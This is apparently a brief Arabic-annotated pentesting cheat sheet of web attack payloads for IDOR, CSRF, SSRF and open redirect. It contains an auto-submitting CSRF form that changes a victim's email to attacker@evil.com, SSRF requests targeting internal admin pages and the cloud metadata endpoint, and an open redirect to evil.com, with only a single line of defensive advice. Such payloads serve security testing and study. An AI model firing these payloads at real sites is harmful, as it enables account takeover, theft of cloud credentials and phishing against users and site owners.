# Web Attacks (عام)

## IDOR
```text
/api/user/1001/profile  -> جرب تغيير الرقم لمستخدم تاني
تأكد دايمًا إن فيه authorization check مش بس authentication
```

## CSRF
```html
<form action="http://<host>/change_email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

## SSRF
```text
http://<host>/fetch?url=http://127.0.0.1:80/admin
http://<host>/fetch?url=http://169.254.169.254/latest/meta-data/   (cloud metadata)
```

## Open Redirect
```text
http://<host>/redirect?url=http://evil.com
```
